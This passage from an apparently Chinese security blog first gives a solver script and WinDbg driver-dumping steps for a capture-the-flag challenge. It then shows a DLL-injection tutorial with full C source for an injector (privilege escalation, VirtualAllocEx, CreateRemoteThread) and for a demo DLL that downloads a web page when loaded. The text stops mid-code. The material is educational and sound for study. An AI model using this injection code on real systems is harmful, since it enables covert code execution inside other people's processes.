class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line">MASK32 = <span class="number">0xFFFFFFFF</span></span><br><span class="line">MASK64 = <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">CT = <span class="built_in">bytes</span>.fromhex(</span><br><span class="line">    <span class="string">&quot;51dab85273b91700e002f4b22c5f2262330c0144bb709d928a06f92c1d8f0aa9&quot;</span></span><br><span class="line">    <span class="string">&quot;227b84307113d0f9&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">INTERVAL = -<span class="number">500000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rol32</span>(<span class="params">x, r</span>):</span><br><span class="line">    r &amp;= <span class="number">31</span></span><br><span class="line">    x &amp;= MASK32</span><br><span class="line">    <span class="keyword">return</span> ((x &lt;&lt; r) | (x &gt;&gt; (<span class="number">32</span> - r))) &amp; MASK32</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ror32</span>(<span class="params">x, r</span>):</span><br><span class="line">    r &amp;= <span class="number">31</span></span><br><span class="line">    x &amp;= MASK32</span><br><span class="line">    <span class="keyword">return</span> ((x &gt;&gt; r) | (x &lt;&lt; (<span class="number">32</span> - r))) &amp; MASK32</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xorshift32</span>(<span class="params">x</span>):</span><br><span class="line">    x &amp;= MASK32</span><br><span class="line">    v2 = (((x &lt;&lt; <span class="number">13</span>) &amp; MASK32) ^ x)</span><br><span class="line">    v2 = ((v2 &gt;&gt; <span class="number">17</span>) ^ v2) &amp; MASK32</span><br><span class="line">    <span class="keyword">return</span> (((v2 &lt;&lt; <span class="number">5</span>) &amp; MASK32) ^ v2) &amp; MASK32</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">derive_seed</span>(<span class="params">interval_signed</span>):</span><br><span class="line">    interval = interval_signed &amp; MASK64</span><br><span class="line">    v18 = <span class="number">0x17658990C729C992</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">57</span>):</span><br><span class="line">        v18 = (interval ^ ((<span class="number">65539</span> * v18) &amp; MASK64)) &amp; MASK64</span><br><span class="line">    <span class="keyword">return</span> v18</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init_tables</span>(<span class="params">a0, a1</span>):</span><br><span class="line">    p = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    v = ((a1 &gt;&gt; <span class="number">21</span>) | ((a1 &lt;&lt; <span class="number">11</span>) &amp; MASK32)) ^ a0 ^ <span class="number">0x1244F4C6</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">        v = xorshift32(v)</span><br><span class="line">        idx = v % (j + <span class="number">1</span>)</span><br><span class="line">        p[j], p[idx] = p[idx], p[j]</span><br><span class="line">    inv = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        inv[p[k]] = k</span><br><span class="line">    <span class="keyword">return</span> p, inv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">expand_round_keys</span>(<span class="params">a0, a1</span>):</span><br><span class="line">    v5 = (a0 ^ <span class="number">0xB7E15163</span>) &amp; MASK32</span><br><span class="line">    v4 = (a1 - <span class="number">0x61C88647</span>) &amp; MASK32</span><br><span class="line">    rk = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v6 = ((((-<span class="number">0x61C88647</span> * i) &amp; MASK32) ^ <span class="number">0xB7E15163</span>) + (rol32(v4, v5 &amp; <span class="number">31</span>) ^ v5)) &amp; MASK32</span><br><span class="line">        w = (ror32((v4 + v5) &amp; MASK32, v4 &amp; <span class="number">31</span>) ^ v6) &amp; MASK32</span><br><span class="line">        rk.append(w)</span><br><span class="line">        v5 = (w ^ v4) &amp; MASK32</span><br><span class="line">        v4 = (rol32(w, v6 &amp; <span class="number">31</span>) + v6) &amp; MASK32</span><br><span class="line">    <span class="keyword">return</span> rk</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mix_block_counter</span>(<span class="params">a5, a0, a1</span>):</span><br><span class="line">    v3 = ((a1 ^ <span class="number">0xDEADBEEF</span>) + (rol32(a0, a5 &amp; <span class="number">31</span>) ^ ((<span class="number">73244475</span> * (a5 + <span class="number">1</span>)) &amp; MASK32))) &amp; MASK32</span><br><span class="line">    t = (((v3 &gt;&gt; <span class="number">16</span>) ^ v3) * <span class="number">2146121005</span>) &amp; MASK32</span><br><span class="line">    v4 = (-<span class="number">2073254261</span> * (((t &gt;&gt; <span class="number">15</span>) ^ t) &amp; MASK32)) &amp; MASK32</span><br><span class="line">    <span class="keyword">return</span> ((v4 &gt;&gt; <span class="number">16</span>) ^ v4) &amp; MASK32</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">subword</span>(<span class="params">x, tab</span>):</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        (tab[(x &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>] &lt;&lt; <span class="number">24</span>)</span><br><span class="line">        | (tab[(x &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>] &lt;&lt; <span class="number">16</span>)</span><br><span class="line">        | (tab[(x &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>] &lt;&lt; <span class="number">8</span>)</span><br><span class="line">        | tab[x &amp; <span class="number">0xFF</span>]</span><br><span class="line">    ) &amp; MASK32</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dec_block</span>(<span class="params">c0, c1, a0, a1, rk, p, inv, blk_idx</span>):</span><br><span class="line">    v16 = mix_block_counter(blk_idx, a0, a1)</span><br><span class="line">    v8 = (c0 ^ ((rol32(v16, <span class="number">11</span>) + a1) &amp; MASK32)) &amp; MASK32</span><br><span class="line">    v12 = (c1 ^ v16 ^ a0) &amp; MASK32</span><br><span class="line"></span><br><span class="line">    v15 = <span class="number">0</span></span><br><span class="line">    v15_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v15 = (v15 + ((rk[i] ^ <span class="number">0xB7E15163</span>) &amp; MASK32)) &amp; MASK32</span><br><span class="line">        v15_list.append(v15)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        v15 = v15_list[i]</span><br><span class="line">        <span class="keyword">if</span> v15 &amp; <span class="number">1</span>:</span><br><span class="line">            v8, v12 = v12, v8</span><br><span class="line"></span><br><span class="line">        v10 = ror32(v8, ((rk[i] &gt;&gt; <span class="number">1</span>) + (v15 ^ v12)) &amp; <span class="number">31</span>)</span><br><span class="line">        t = rol32((v12 - (rk[i] ^ v10)) &amp; MASK32, p[v10 &amp; <span class="number">0xFF</span>] &amp; <span class="number">31</span>)</span><br><span class="line">        v12_prev = subword(t, inv)</span><br><span class="line"></span><br><span class="line">        s = (</span><br><span class="line">            (v10 ^ rol32(rk[i], t &amp; <span class="number">31</span>) ^ ((rol32(v15, <span class="number">29</span>) + t) &amp; MASK32))</span><br><span class="line">            - (rk[i] ^ v15)</span><br><span class="line">        ) &amp; MASK32</span><br><span class="line">        v8_prev = subword(s, inv)</span><br><span class="line"></span><br><span class="line">        v8, v12 = v8_prev, v12_prev</span><br><span class="line"></span><br><span class="line">    w0 = ((v16 + a0) ^ v8) &amp; MASK32</span><br><span class="line">    w1 = (rol32(v16, <span class="number">25</span>) ^ a1 ^ v12) &amp; MASK32</span><br><span class="line">    <span class="keyword">return</span> w0, w1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_40</span>(<span class="params">ct40, interval_signed</span>):</span><br><span class="line">    seed = derive_seed(interval_signed)</span><br><span class="line">    a0 = seed &amp; MASK32</span><br><span class="line">    a1 = (seed &gt;&gt; <span class="number">32</span>) &amp; MASK32</span><br><span class="line">    p, inv = init_tables(a0, a1)</span><br><span class="line">    rk = expand_round_keys(a0, a1)</span><br><span class="line"></span><br><span class="line">    out = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> bi <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        blk = ct40[bi * <span class="number">8</span>: bi * <span class="number">8</span> + <span class="number">8</span>]</span><br><span class="line">        c0 = <span class="built_in">int</span>.from_bytes(blk[<span class="number">0</span>:<span class="number">4</span>], <span class="string">&quot;little&quot;</span>)</span><br><span class="line">        c1 = <span class="built_in">int</span>.from_bytes(blk[<span class="number">4</span>:<span class="number">8</span>], <span class="string">&quot;little&quot;</span>)</span><br><span class="line">        w0, w1 = dec_block(c0, c1, a0, a1, rk, p, inv, bi)</span><br><span class="line">        out += w0.to_bytes(<span class="number">4</span>, <span class="string">&quot;little&quot;</span>)</span><br><span class="line">        out += w1.to_bytes(<span class="number">4</span>, <span class="string">&quot;little&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(out)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pt = decrypt_40(CT, INTERVAL)</span><br><span class="line"><span class="built_in">print</span>(pt)</span><br><span class="line"><span class="built_in">print</span>(pt.rstrip(<span class="string">b&quot;\x00&quot;</span>).decode(<span class="string">&quot;ascii&quot;</span>, errors=<span class="string">&quot;replace&quot;</span>))</span><br></pre></td></tr></table></figure><p>ebbc8827-c040-4a7d-8bc7-0aeccb1ce094</p><h2 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h2><p>不太了解内核逆向</p><p>参考[<a href="https://qmeimei10086.github.io/2026/02/05/VNCTF-2026-Shadow-%E9%A9%B1%E5%8A%A8dump%E4%BF%AE%E5%A4%8D+%E5%8F%8D%E5%B0%84%E6%B3%A8%E5%85%A5+ptehook/">VNCTF 2026]Shadow-驱动dump修复+反射注入+ptehook - Qmeimei’s Blog | 探索一切，攻破一切</a></p><p>师傅写的很详细</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; sxe ld Shadow.sys</span><br><span class="line">kd&gt; g</span><br><span class="line">kd&gt; bp Shadow+0xC1B7</span><br><span class="line">kd&gt; g</span><br></pre></td></tr></table></figure><p>断再这里</p><blockquote><p><code>sxe</code> &#x3D; <strong>Set Exception (on) Event</strong></p><p>当某个指定的“调试事件”发生时，让调试器中断下来。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260220234731673.png" alt="image-20260220234731673"></p><p>这里的rcx就是载入驱动的首地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r rcx</span><br></pre></td></tr></table></figure><p>查看rcx寄存器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">db rcx L10</span><br><span class="line">!dh rcx # 把 rcx 当成一个 PE 映像基址，解析并显示它的 DOS 头和 NT 头</span><br></pre></td></tr></table></figure><p><code>d</code> &#x3D; display memory</p><p><code>b</code> &#x3D; byte（按字节显示）</p><p><code>rcx</code> &#x3D; 起始地址</p><p><code>L10</code> &#x3D; 显示 0x10 个字节（16字节）</p><p>输出有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10.00 subsystem version</span><br><span class="line"> A000 size of image</span><br><span class="line">  400 size of headers</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.writemem D:\dumped.sys ffffb683ef916000 L?<span class="number">0</span>xA000</span><br></pre></td></tr></table></figure><p>dump出来</p><p>之后就是修复符号</p><blockquote><p>不错的教程：<a href="https://bbs.kanxue.com/thread-274505-1.htm">https://bbs.kanxue.com/thread-274505-1.htm</a></p><p>想看原理可以看里面的文章讲的非常好</p><p>里面的pe_unmapper挺好用的，<a href="https://github.com/hasherezade/libpeconv/tree/master/pe_unmapper">https://github.com/hasherezade/libpeconv/tree/master/pe_unmapper</a></p></blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pe_unmapper.exe /<span class="keyword">in</span> D:\dumped.sys <span class="number">00400000</span> /out fix.dump</span><br></pre></td></tr></table></figure><p>直接修复</p><p>修复方法2</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260223222525923.png" alt="image-20260223222525923"></p><h1 id="DLL注入"><a href="#DLL注入" class="headerlink" title="DLL注入"></a>DLL注入</h1><p>之前学过但是得详细了解下，这里再补充一下</p><p><a href="https://www.cnblogs.com/Zer0o/p/17286597.html#dll%E6%B3%A8%E5%85%A5">《逆向工程核心原理》之DLL注入 - Zer0o - 博客园</a></p><p><a href="https://matriy330.github.io/791560d6/">UE4逆向初探-OverWatch | Matriy’s blog</a></p><p>DLL注入指的是向运行中的其他进程强制插入特定的DLL文件。从技术细节来说，DLL注入命令其他进程自行调用LoadLibrary() API,加载用户指定的DLL文件。DLL注入与一般DLL加载的区别在于，加载的目标进程是其自身或其他进程。</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260216130408174.png" alt="image-20260216130408174"></p><p>向某个进程注入DLL时主要使用以下三种方法：</p><ul><li>创建远程线程（CreateRemoteThread() API）</li><li>使用注册表（AppInit_DLLs值）</li><li>消息钩取（SetWindowsHookEx() API）</li></ul><h2 id="CreateRemoteThread"><a href="#CreateRemoteThread" class="headerlink" title="CreateRemoteThread"></a>CreateRemoteThread</h2><p>基本原理：</p><ol><li><code>OpenProcess()</code> 获取目标进程句柄</li><li><code>VirtualAllocEx()</code> 在目标进程中分配内存</li><li><code>WriteProcessMemory()</code> 写入 DLL 路径</li><li><code>CreateRemoteThread()</code> 调用 <code>LoadLibraryA/W</code></li></ol><p>案例中的myhack.dll</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;tchar.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;urlmon.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_URL     (<span class="string">L&quot;http://www.naver.com/index.html&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_FILE_NAME   (<span class="string">L&quot;index.html&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">HMODULE g_hMod = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProc</span><span class="params">(LPVOID lParam)</span></span><br><span class="line">&#123;</span><br><span class="line">    TCHAR szPath[_MAX_PATH] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( !GetModuleFileName( g_hMod, szPath, MAX_PATH ) )</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">    TCHAR *p = _tcsrchr( szPath, <span class="string">&#x27;\\&#x27;</span> );</span><br><span class="line">    <span class="keyword">if</span>( !p )</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line"><span class="comment">//下载指定网站的index.html</span></span><br><span class="line">    _tcscpy_s(p+<span class="number">1</span>, _MAX_PATH, DEF_FILE_NAME);</span><br><span class="line"></span><br><span class="line">    URLDownloadToFile(<span class="literal">NULL</span>, DEF_URL, szPath, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span></span><br><span class="line">&#123;</span><br><span class="line">    HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    g_hMod = (HMODULE)hinstDLL;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>( fdwReason )</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH : <span class="comment">//加载时</span></span><br><span class="line">        OutputDebugString(<span class="string">L&quot;&lt;myhack.dll&gt; Injection!!!&quot;</span>); <span class="comment">//输出调试字符串</span></span><br><span class="line">        hThread = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>); <span class="comment">//创建线程</span></span><br><span class="line">        CloseHandle(hThread);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>在DllMain()函数中可以看到，该DLL被加载（DLL_PROCESS_ATTACH）时，先输出一个调试字符串（“myhack.dll Injection!!!”），然后创建线程调用函数（ThreadProc）。在ThreadProc()函数中通过调用urlmon!URLDownloadToFile() API来下载指定网站的index.html文件。前面提到过，向进程注入DLL后就会调用执行该DLL的DllMain()函数。所以当myhack.dll注入notepad.exe进程后，最终会调用执行URLDownloadToFile()API。</p></blockquote><p><strong>InjectDII.cpp</strong>InjectDll.exe程序用来将myhack.dll注入notepad.exe进程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;tchar.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">SetPrivilege</span><span class="params">(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)</span> </span><br><span class="line">&#123;</span><br><span class="line">    TOKEN_PRIVILEGES tp;</span><br><span class="line">    HANDLE hToken;</span><br><span class="line">    LUID luid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( !OpenProcessToken(GetCurrentProcess(),</span><br><span class="line">                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, </span><br><span class="line">              &amp;hToken) )</span><br><span class="line">    &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;OpenProcessToken error: %u\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( !LookupPrivilegeValue(<span class="literal">NULL</span>,           <span class="comment">// lookup privilege on local system</span></span><br><span class="line">                              lpszPrivilege,  <span class="comment">// privilege to lookup </span></span><br><span class="line">                              &amp;luid) )        <span class="comment">// receives LUID of privilege</span></span><br><span class="line">    &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;LookupPrivilegeValue error: %u\n&quot;</span>, GetLastError() ); </span><br><span class="line">        <span class="keyword">return</span> FALSE; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    tp.Privileges[<span class="number">0</span>].Luid = luid;</span><br><span class="line">    <span class="keyword">if</span>( bEnablePrivilege )</span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Enable the privilege or disable all privileges.</span></span><br><span class="line">    <span class="keyword">if</span>( !AdjustTokenPrivileges(hToken, </span><br><span class="line">                               FALSE, </span><br><span class="line">                               &amp;tp, </span><br><span class="line">                               <span class="keyword">sizeof</span>(TOKEN_PRIVILEGES), </span><br><span class="line">                               (PTOKEN_PRIVILEGES) <span class="literal">NULL</span>, </span><br><span class="line">                               (PDWORD) <span class="literal">NULL</span>) )</span><br><span class="line">    &#123; </span><br><span class="line">        _tprintf(<span class="string">L&quot;AdjustTokenPrivileges error: %u\n&quot;</span>, GetLastError() ); </span><br><span class="line">        <span class="keyword">return</span> FALSE; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( GetLastError() == ERROR_NOT_ALL_ASSIGNED )</span><br><span class="line">    &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;The token does not have the specified privilege. \n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">InjectDll</span><span class="params">(DWORD dwPID, LPCTSTR szDllPath)</span></span><br><span class="line">&#123;</span><br><span class="line">    HANDLE hProcess = <span class="literal">NULL</span>, hThread = <span class="literal">NULL</span>;</span><br><span class="line">    HMODULE hMod = <span class="literal">NULL</span>;</span><br><span class="line">    LPVOID pRemoteBuf = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + <span class="number">1</span>) * <span class="keyword">sizeof</span>(TCHAR);</span><br><span class="line">    LPTHREAD_START_ROUTINE pThreadProc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// #1. 使用 dwPID 获取目标进程(notepad.exe)句柄（PROCESS_ALL_ACCESS权限），然后就可以用 hProcess 控制进程.</span></span><br><span class="line">    <span class="keyword">if</span> ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) )</span><br><span class="line">    &#123;        <span class="comment">//OpenProcess调用API，借助PID获取目标权限</span></span><br><span class="line">        _tprintf(<span class="string">L&quot;OpenProcess(%d) failed!!! [%d]\n&quot;</span>, dwPID, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// #2. 在目标进程(notepad.exe) 内存中分配 szDllName 大小的内存，返回 pRemoteBuf 作为该缓冲区的地址.</span></span><br><span class="line">    pRemoteBuf = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// #3. 将 myhack.dll 路径写入刚刚分配的缓冲区.</span></span><br><span class="line">    WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// #4. 获取 LoadLibraryW() API 地址，kernel32.dll在每个进程中的加载地址相同（这个特性就是我们要利用的）.</span></span><br><span class="line">    hMod = GetModuleHandle(<span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line">    pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// #5. 在 notepad.exe 中运行线程</span></span><br><span class="line">    hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, pThreadProc, pRemoteBuf, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    WaitForSingleObject(hThread, INFINITE);</span><br><span class="line"></span><br><span class="line">    CloseHandle(hThread);</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, TCHAR *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>( argc != <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;USAGE : %s &lt;pid&gt; &lt;dll_path&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// change privilege</span></span><br><span class="line">    <span class="keyword">if</span>( !SetPrivilege(SE_DEBUG_NAME, TRUE) )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// inject dll</span></span><br><span class="line">    <span class="keyword">if</span>( InjectDll((DWORD)_tstol(argv[<span class="number">1</span>]), argv[<span class="number">2</span>]) )</span><br><span class="line">        _tprintf(<span class="string">L&quot;InjectDll(\&quot;%s\&quot;) success!!!\n&quot;</span>, argv[<span 